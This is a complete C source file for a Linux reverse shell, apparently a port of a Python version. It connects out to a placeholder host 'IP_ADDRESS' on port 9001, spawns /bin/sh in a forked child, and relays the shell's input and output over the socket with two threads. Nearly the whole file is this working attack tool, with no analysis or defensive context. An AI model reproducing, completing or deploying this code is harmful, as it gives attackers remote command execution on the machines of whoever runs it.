// Linux / Unix
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>

#define BUFFER_SIZE 1024

/* Structure to pass arguments to threads */
typedef struct {
    int sock;       /* Socket file descriptor */
    int stdin_fd;   /* Pipe write end for stdin */
    int stdout_fd;  /* Pipe read end for stdout */
} thread_args_t;

/* Thread function: socket -> process (s2p) */
void *s2p(void *arg) {
    thread_args_t *args = (thread_args_t *)arg;
    char buffer[BUFFER_SIZE];
    ssize_t bytes_received;
    
    while (1) {
        bytes_received = recv(args->sock, buffer, BUFFER_SIZE, 0);
        if (bytes_received > 0) {
            write(args->stdin_fd, buffer, bytes_received);
        } else if (bytes_received == 0) {
            /* Connection closed */
            break;
        } else {
            /* Error or interrupted */
            break;
        }
    }
    
    return NULL;
}

/* Thread function: process -> socket (p2s) */
void *p2s(void *arg) {
    thread_args_t *args = (thread_args_t *)arg;
    char buffer[1];  /* Read one byte at a time like the Python version */
    ssize_t bytes_read;
    
    while (1) {
        bytes_read = read(args->stdout_fd, buffer, 1);
        if (bytes_read > 0) {
            send(args->sock, buffer, bytes_read, 0);
        } else if (bytes_read == 0) {
            /* EOF - shell exited */
            break;
        } else {
            /* Error or interrupted */
            break;
        }
    }
    
    return NULL;
}

/* Signal handler for SIGINT (Ctrl+C) to clean up */
volatile sig_atomic_t g_running = 1;

void signal_handler(int signum) {
    (void)signum;
    g_running = 0;
}

int main(void) {
    int sock;
    struct sockaddr_in server_addr;
    int pipe_stdin[2];   /* Pipe for writing to child's stdin */
    int pipe_stdout[2];  /* Pipe for reading child's stdout */
    pid_t pid;
    pthread_t s2p_thread, p2s_thread;
    thread_args_t args;
    int status;
    
    /* Set up signal handler for clean shutdown */
    signal(SIGINT, signal_handler);
    
    /* Create TCP socket */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[-] socket failed");
        return EXIT_FAILURE;
    }
    
    /* Configure server address structure */
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(9001);
    if (inet_pton(AF_INET, "IP_ADDRESS", &server_addr.sin_addr) <= 0) {
        perror("[-] invalid address");
        close(sock);
        return EXIT_FAILURE;
    }
    
    /* Connect to remote server */
    printf("[*] Connecting to IP_ADDRESS:9001...\n");
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] connection failed");
        close(sock);
        return EXIT_FAILURE;
    }
    printf("[+] Connected!\n");
    
    /* Create pipes for stdin redirection (parent writes, child reads) */
    if (pipe(pipe_stdin) < 0) {
        perror("[-] pipe_stdin failed");
        close(sock);
        return EXIT_FAILURE;
    }
    
    /* Create pipes for stdout redirection (child writes, parent reads) */
    if (pipe(pipe_stdout) < 0) {
        perror("[-] pipe_stdout failed");
        close(sock);
        close(pipe_stdin[0]);
        close(pipe_stdin[1]);
        return EXIT_FAILURE;
    }
    
    /* Fork to create child process for shell */
    pid = fork();
    if (pid < 0) {
        perror("[-] fork failed");
        close(sock);
        close(pipe_stdin[0]);
        close(pipe_stdin[1]);
        close(pipe_stdout[0]);
        close(pipe_stdout[1]);
        return EXIT_FAILURE;
    }
    
    if (pid == 0) {
        /* ===== CHILD PROCESS ===== */
        
        /* Close unused pipe ends */
        close(pipe_stdin[1]);   /* Don't need write end of stdin pipe */
        close(pipe_stdout[0]);  /* Don't need read end of stdout pipe */
        
        /* Redirect stdin, stdout, stderr */
        dup2(pipe_stdin[0], STDIN_FILENO);    /* stdin reads from pipe */
        dup2(pipe_stdout[1], STDOUT_FILENO);  /* stdout writes to pipe */
        dup2(pipe_stdout[1], STDERR_FILENO);  /* stderr also writes to pipe */
        
        /* Close original pipe fds after duplication */
        close(pipe_stdin[0]);
        close(pipe_stdout[1]);
        
        /* Execute shell */
        execl("/bin/sh", "sh", NULL);
        
        /* If exec fails */
        perror("[-] exec failed");
        _exit(EXIT_FAILURE);
        
    } else {
        /* ===== PARENT PROCESS ===== */
        
        /* Close unused pipe ends */
        close(pipe_stdin[0]);   /* Don't need read end of stdin pipe */
        close(pipe_stdout[1]);  /* Don't need write end of stdout pipe */
        
        /* Prepare thread arguments */
        args.sock = sock;
        args.stdin_fd = pipe_stdin[1];
        args.stdout_fd = pipe_stdout[0];
        
        /* Create s2p thread (daemon-like behavior via join later) */
        if (pthread_create(&s2p_thread, NULL, s2p, &args) != 0) {
            perror("[-] Failed to create s2p thread");
        }
        
        /* Create p2s thread (daemon-like behavior via join later) */
        if (pthread_create(&p2s_thread, NULL, p2s, &args) != 0) {
            perror("[-] Failed to create p2s thread");
        }
        
        /* Wait for child process to finish (equivalent to p.wait()) */
        while (g_running && waitpid(pid, &status, WNOHANG) == 0) {
            usleep(100000);  /* Check every 100ms */
        }
        
        if (!g_running) {
            /* SIGINT received - clean up like KeyboardInterrupt handler */
            printf("\n[*] Interrupted, closing connection...\n");
            
            /* Cancel threads */
            pthread_cancel(s2p_thread);
            pthread_cancel(p2s_thread);
        }
        
        /* Wait for threads to finish */
        pthread_join(s2p_thread, NULL);
        pthread_join(p2s_thread, NULL);
        
        /* Clean up resources (equivalent to s.close()) */
        close(sock);
        close(pipe_stdin[1]);
        close(pipe_stdout[0]);
        
        printf("[*] Connection closed.\n");
    }
    
    return EXIT_SUCCESS;
}
